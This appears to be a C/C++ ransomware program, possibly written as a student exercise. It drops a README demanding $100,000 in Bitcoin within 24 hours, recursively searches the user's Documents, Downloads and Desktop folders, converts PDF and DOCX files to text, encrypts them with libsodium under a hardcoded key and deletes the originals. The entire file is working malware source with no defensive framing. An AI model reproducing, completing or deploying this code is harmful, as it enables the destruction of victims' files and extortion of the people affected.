#include <stdio.h>
#include <dirent.h>
#include <sys/types.h>
#include <string.h>
#include <fcntl.h>
#include <sodium.h>
#include <stdlib.h>
#include <iostream>
#include <poppler/cpp/poppler-document.h>
#include <poppler/cpp/poppler-page.h>
#include <zip.h>
#include <vector>
#include </usr/include/libxml2/libxml/parser.h>
#include </usr/include/libxml2/libxml/tree.h>
using namespace std;
// CONSTANTS
#define MAX_FILE_LEN 2000
#define CHUNK_SIZE 4096
const unsigned char KEY[crypto_secretstream_xchacha20poly1305_KEYBYTES] = {0x6a, 0x07, 0xd3, 0x8a, 0x65, 0xbf, 0x14, 0xe8, 0x31, 0xb4, 0x25, 0xd0, 0xd1, 0x18, 0xc4, 0x22, 0xe5, 0xc9, 0xd5, 0x40, 0x29, 0x08, 0x44, 0x12, 0xe3, 0xf5, 0x2c, 0x1b, 0xc6, 0xe4, 0x1d, 0xa6};
// FUNC DEFN'S
int doEncryptDir(char dirname[], struct dirent *dp, const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES]);
int encrypt(char *src_file, char *dest_file, const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES]);
int pdfToText(char *filename, char *raw_pt_file);
int docToText(char *filename, char *raw_pt_file);
void traverseXml(xmlNode *node, FILE *raw_pt_file);

int main()
{
    // create readme with key for decryption
    FILE *readme = fopen("README.txt", "w");
    const char *payload = "Your files have been encrypted.\n It is impossible to recover them without my secret key.\n To get the key, transfer $100,000 to my Bitcoin account. You have 24 hours.\n";
    printf("size of payload: %d", sizeof(payload));
    fwrite(payload, 1, strlen(payload), readme);
    fclose(readme);

    // setup target directories
    char *target_folders[] = {"Documents", "Downloads", "Desktop"};
    if (sodium_init() != 0)
    {
        return 1;
    }
    // iterate through each target folder
    for (int i = 0; i < 3; ++i)
    {
        char dirname[MAX_FILE_LEN];
        snprintf(dirname, sizeof dirname, "%s/%s", getenv("HOME"), target_folders[i]);
        struct dirent *root;
        if (doEncryptDir(dirname, root, KEY) != 0)
        {
            return 1;
        }
    }
    return 0;
}

int pdfToText(char *filename, char *raw_pt_file)
{
    poppler::document *pdf = poppler::document::load_from_file(filename);
    int num_pages = pdf->pages();
    FILE *pt_txt = fopen(raw_pt_file, "wb");
    for (int i = 0; i < num_pages; ++i)
    {
        poppler::page *curr_page = pdf->create_page(i);
        // extract text from pdf
        poppler::ustring text = curr_page->text();
        // write to txt file
        poppler::byte_array encoded_text = text.to_utf8();
        std::string pt(encoded_text.begin(), encoded_text.end());
        size_t out_len = fwrite(pt.c_str(), 1, pt.size() - 1, pt_txt);
        if (out_len != (pt.size() - 1))
        {
            return -1;
        }
    }
    fclose(pt_txt);
    remove(filename);
    return 0;
}

int docToText(char *filename, char *raw_pt_file)
{
    int err;
    // open docx file (which is an archive of xmls)
    zip_t *archive = zip_open(filename, 0, &err);
    // open out file
    FILE *pt_file = fopen(raw_pt_file, "wb");
    if (archive == NULL)
    {
        printf("Could not open docx file with name %s\n", filename);
    }
    // open main xml file (word/document.xml), which contains text data
    const char *xml_path = "word/document.xml";
    zip_file_t *doc = zip_fopen(archive, xml_path, 0);
    if (doc == NULL)
    {
        printf("Could not open docx file with name %s\n", filename);
        fclose(pt_file);
        zip_close(archive);
        return -1;
    }
    zip_stat_t st;
    zip_stat(archive, xml_path, 0, &st);
    // read file in one go
    char *buffer_in = (char *)malloc(st.size + 1);
    zip_fread(doc, buffer_in, st.size);
    buffer_in[st.size] = '\0';

    xmlDoc *xml_file = xmlReadMemory(buffer_in, st.size, NULL, NULL, 0);
    xmlNode *root = xmlDocGetRootElement(xml_file);
    traverseXml(root, pt_file);

    xmlFreeDoc(xml_file);
    xmlCleanupParser();
    fclose(pt_file);
    zip_fclose(doc);
    zip_close(archive);
    remove(filename);
    return 0;
}

// I acknowledge the use of AI to assist in the implementation of the traverseXml function,
// namely to understand which nodes contained the document text and implmenent recursion.
void traverseXml(xmlNode *node, FILE *raw_pt_file)
{
    while (node)
    {
        // only extract certain nodes in xml tree.
        if (node->type == XML_ELEMENT_NODE && xmlStrcmp(node->name, BAD_CAST "t") == 0)
        {
            if (node->children && node->children->content)
                fwrite(node->children->content, 1, strlen((char *)node->children->content), raw_pt_file);
        }
        traverseXml(node->children, raw_pt_file);
        node = node->next;
    }
}

int doEncryptDir(char dirname[], struct dirent *dp, const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES])
{
    // open curr dir
    DIR *dir = opendir(dirname);
    // print each file/subdirectory in the current dir
    while (dir)
    {
        dp = readdir(dir);
        // BASE CASE: reached end of subdirectory
        if (dp == NULL)
        {
            closedir(dir);
            return 0;
        }
        // RECURSIVE CASE: print current file/dir in parent dir
        else
        {
            // encrypt file if .pdf or .docx
            char *filename = dp->d_name;
            char filepath[MAX_FILE_LEN];
            char enc_file[MAX_FILE_LEN];
            snprintf(filepath, MAX_FILE_LEN, "%s/%s", dirname, filename);
            snprintf(enc_file, MAX_FILE_LEN, "%s.enc", filepath);

            if (strstr(filename, ".pdf"))
            {
                char out_file[MAX_FILE_LEN];
                snprintf(out_file, MAX_FILE_LEN, "%s.txt", filepath);

                if (pdfToText(filepath, out_file) != 0)
                {
                    return -1;
                }
                if (encrypt(out_file, enc_file, key) != 0)
                {
                    return -1;
                }
            }
            else if (strstr(filename, ".docx"))
            {
                char out_file[MAX_FILE_LEN];
                snprintf(out_file, MAX_FILE_LEN, "%s.txt", filepath);

                if (docToText(filepath, out_file) != 0)
                {
                    return -1;
                }
                if (encrypt(out_file, enc_file, key) != 0)
                {
                    return -1;
                }
            }
            else
            {
                printf("Incompatible file type\n");
            }
            // check if file or dir
            if (strchr(dp->d_name, (int)'.'))
            {
                continue;
            }
            char new_dirname[MAX_FILE_LEN];
            struct dirent *subdp = NULL;
            snprintf(new_dirname, MAX_FILE_LEN, "%s/%s", dirname, dp->d_name);
            doEncryptDir(new_dirname, subdp, key);
        }
    }
    closedir(dir);
}

// code adapted from libsodium sample code available here:
// https://doc.libsodium.org/secret-key_cryptography/secretstream#file-encryption-example-code

int encrypt(char *src_file, char *dest_file, const unsigned char key[crypto_secretstream_xchacha20poly1305_KEYBYTES])
{
    // declare vars
    unsigned char buffer_in[CHUNK_SIZE];
    unsigned char buffer_out[CHUNK_SIZE + crypto_secretstream_xchacha20poly1305_ABYTES];
    unsigned char header[crypto_secretstream_xchacha20poly1305_HEADERBYTES];
    crypto_secretstream_xchacha20poly1305_state st;
    unsigned long long out_len;
    size_t rlen;
    int eof;
    unsigned char tag;

    // open pt file
    FILE *fd_s = fopen(src_file, "rb");
    FILE *fd_d = fopen(dest_file, "wb+");
    if (fd_s == NULL)
    {
        printf("Could not find file with path %s\n", src_file);
        return 1;
    }
    if (fd_d == NULL)
    {
        printf("Could not find file with path %s\n", dest_file);
        return 1;
    }
    // initialise header
    crypto_secretstream_xchacha20poly1305_init_push(&st, header, key);
    // copy header into out file
    fwrite(header, 1, sizeof header, fd_d);
    do
    {
        rlen = fread(buffer_in, 1, sizeof buffer_in, fd_s);
        eof = feof(fd_s);
        tag = eof ? crypto_secretstream_xchacha20poly1305_TAG_FINAL : 0;
        // encrypt pt bytes
        crypto_secretstream_xchacha20poly1305_push(&st, buffer_out, &out_len, buffer_in, rlen, NULL, 0, tag);
        // write encrypted text to out file
        fwrite(buffer_out, 1, (size_t)out_len, fd_d);

    } while (!eof);
    // close out file and delete src file
    fclose(fd_d);
    fclose(fd_s);
    remove(src_file);
    return 0;
}